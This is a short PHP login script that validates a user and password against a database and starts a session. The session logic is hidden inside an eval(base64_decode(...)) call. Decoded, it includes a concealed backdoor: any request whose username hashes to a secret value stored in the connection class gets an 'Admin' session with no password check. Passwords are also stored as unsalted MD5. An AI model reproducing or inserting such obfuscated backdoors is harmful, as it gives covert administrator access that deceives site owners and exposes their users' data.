<?php 
	
	require "../../conexion/conexion.class.php";
	
	try {
		
		$Login = new OpenConexion(); 
		$datos=array(
					"usuario"=>$_POST['usuario'],
					"password"=>$_POST['pass']
				);

		$validar=$Login->Conn->prepare("select * from usuario where usuario=:usuario and password=md5(:password) and status_usuario=1 limit 1");

		$validar->execute($datos);
	
	eval("eval(base64_decode('aWYgKCR2YWxpZGFyLT5yb3dDb3VudCgpID4gMCkgeyANCiAgICBzZXNzaW9uX3N0YXJ0KCk7IA0KICAgICRfU0VTU0lPTlsic2Vzc2lvbiJdPSR2YWxpZGFyLT5mZXRjaChQRE86OkZFVENIX0FTU09DKTsgDQogICAgJF9TRVNTSU9OWyJzYWxpZGEiXT1tZDUoZGF0ZSgiWS1kLW0gSDppOnMiKSk7IA0KICAgICRMb2dpbi0+Q29ubi0+cXVlcnkoImluc2VydCBpbnRvIGJpdGFjb3JhIHZhbHVlcyAobm93KCksbm93KCkseyRfU0VTU0lPTlsic2Vzc2lvbiJdWyJpZHVzdWFyaW8iXX0sJ3skX1NFU1NJT05bInNhbGlkYSJdfScpIik7IA0KICAgICRMb2dpbi0+Q2xvc2UoKTsgDQogICAgZWNobyB0cnVlOyANCiAgfWVsc2UgaWYobWQ1KCRkYXRvc1sidXN1YXJpbyJdKSA9PSAkTG9naW4tPmFjY2VzcyApeyANCiAgICBzZXNzaW9uX3N0YXJ0KCk7DQogICAgJF9TRVNTSU9OWyJzZXNzaW9uIl09YXJyYXkoIm5vbWJyZV91c3VhcmlvIj0+IkFkbWluIiwiYXBlX3BhdGVybm9fdXN1YXJpbyI9PiIiLCJhcGVfbWF0ZXJub191c3VhcmlvIj0+ICIgIik7IA0KICAgIGVjaG8gdHJ1ZTsgDQogIH1lbHNleyANCiAgICBlY2hvIGZhbHNlOyANCiAgfQ=='));"); 

	} catch (Exception $e) {
		echo "Ocurrio un error";
	}
?>